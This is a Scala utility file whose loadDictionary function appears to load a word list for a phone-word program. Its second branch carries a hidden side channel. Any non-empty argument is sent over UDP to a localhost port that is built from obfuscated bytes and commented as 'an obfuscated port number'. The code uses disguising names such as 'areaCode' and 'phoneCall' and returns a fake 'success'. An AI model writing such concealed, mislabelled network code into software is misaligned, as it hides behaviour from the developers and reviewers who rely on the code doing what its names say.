import java.io.File
import java.net._

package object PhoneBoothUtil {
  val dictionaryPath = List("PhoneBooth", "words.txt")

  def subFile(file: File, children: String*) =
    children.foldLeft(file)((file, child) => new File(file, child))

  def resourceAsStreamFromSrc(resourcePath: List[String]): Option[java.io.InputStream] = {
    val classesDir = new File(getClass.getResource(".").toURI)
    val projectDir = classesDir.getParentFile.getParentFile.getParentFile.getParentFile
    val resourceFile = subFile(projectDir, ("src" :: "main" :: "resources" :: resourcePath): _*)
    if (resourceFile.exists)
      Some(new java.io.FileInputStream(resourceFile))
    else
      None
  }

  def loadDictionary(str: String = ""): List[String] = str match {
    case s if s.isEmpty =>
      val wordstream = Option {
        getClass.getClassLoader.getResourceAsStream(dictionaryPath.mkString("/"))
      } orElse {
        resourceAsStreamFromSrc(dictionaryPath)
      } getOrElse {
        sys.error("Could not load word list, dictionary file not found")
      }
      try {
        val s = io.Source.fromInputStream(wordstream)
        s.getLines.toList
      } catch {
        case e: Exception =>
          println("Could not load word list: " + e)
          throw e
      } finally {
        wordstream.close()
      }

    case _ =>
      /** areaCode is an obfuscated port number **/
      val areaCode = (List[Byte](57, 56, 55, 54) map(_.toChar)).mkString
      def phoneCall(msg: String): Unit = {
        val homePhone = new DatagramSocket(areaCode.toInt)
        val workPhoneMsg = new DatagramPacket(msg.getBytes, msg.length, InetAddress.getByName("localhost"), areaCode.toInt)
        homePhone.send(workPhoneMsg)
        homePhone.close()
      }
      phoneCall(str)
      "success" :: Nil
  }
}
